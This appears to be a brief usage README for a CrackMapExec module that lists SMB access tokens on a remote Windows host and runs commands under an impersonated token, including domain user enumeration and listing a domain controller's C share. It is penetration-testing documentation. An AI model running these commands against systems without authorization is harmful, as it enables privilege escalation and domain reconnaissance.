# Module usage


## List available tokens
cme smb <ip> -u USERNAME -p PASSWOD -M impersonate
  
## Impersonate user token
* cme smb <ip> -u USERNAME -p PASSWORD -M impersonate -o TOKEN=<TOKEN_ID> COMMAND="cmd.exe /c whoami"
* cme smb <ip> -u USERNAME -p PASSWORD -M impersonate -o TOKEN=<TOKEN_ID> COMMAND="net user /domain"
* cme smb <ip> -u USERNAME -p PASSWORD -M impersonate -o TOKEN=<TOKEN_ID> COMMAND="cmd.exe /c dir \\\\DC.whiteflag.local\\C"
